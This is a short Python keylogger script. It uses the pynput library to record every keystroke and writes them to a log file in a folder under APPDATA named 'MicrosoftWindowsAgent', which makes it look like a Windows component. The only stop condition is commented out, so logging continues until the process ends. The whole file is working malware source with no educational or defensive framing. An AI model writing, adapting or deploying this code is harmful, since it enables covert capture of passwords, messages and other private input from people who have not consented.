from pynput.keyboard import Key, Listener
from os import getenv, path, makedirs

# Directory and file for saving the log
file_local_save = getenv('APPDATA')
log_dir = path.join(file_local_save, "MicrosoftWindowsAgent")
log_file = path.join(log_dir, "log000.txt")

# Create directory if it doesn't exist
if not path.exists(log_dir):
    makedirs(log_dir)

# Log function to write keys
def on_press(key):
    try:
        with open(log_file, "a") as log:
            try:
                log.write(f"{key.char}")
            except AttributeError:  # Handle special keys
                if key == Key.space:
                    log.write(" ")
                elif key == Key.enter:
                    log.write("\n<Enter>\n")
                else:
                    log.write(f"\n<{key}>\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

# Stop log when ESC is pressed (uncomment if needed)
'''
def on_release(key):
    if key == Key.esc:
        return False
'''

with Listener(on_press=on_press) as listener:
    listener.join()
